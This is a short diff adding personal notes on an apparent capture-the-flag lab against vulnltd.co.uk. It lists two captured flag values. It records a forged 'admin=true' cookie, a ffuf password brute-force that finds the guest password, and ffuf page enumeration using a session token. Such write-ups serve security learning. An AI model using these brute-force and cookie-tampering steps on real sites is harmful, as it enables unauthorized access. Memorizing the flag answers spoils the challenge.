@@ -1,0 +1,23 @@
+vulnltd.co.uk
+
+flag1 => [^FLAG^B14F856BC5AD17151A55F097E1805A01^FLAG^]
+robots.txt 
+
+flag2 => [^FLAG^F01EF758672F38E8C7BF41B0AD1BB431^FLAG^]
+login as guest and set cookie "admin=true" 
+$ ffuf -w day_of_week.txt -X POST -d "username=guest&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://www.vulnltd.co.uk/secr3t_l0g1n/login -mc all
+tuesday                 [Status: 302, Size: 0, Words: 1, Lines: 1]
+
+flag3 =>
+
+if user_id is deleted, we're logged out.
+if user_id is changed, nothing happens.
+
+since we can't modify or create web pages, maybe we are supposed to extract information from the source code.
+
+$ ffuf -w 1-1000.txt -u https://www.vulnltd.co.uk/secr3t_l0g1n/page/FUZZ -b "admin=true;token=80e779b9be92a08349c06ed7b2fd9d22;user_id=2"
+
+
+(*) https://support.vulnltd.co.uk/
+(*) https://www.vulnltd.co.uk/secr3t_l0g1n/page/new
+
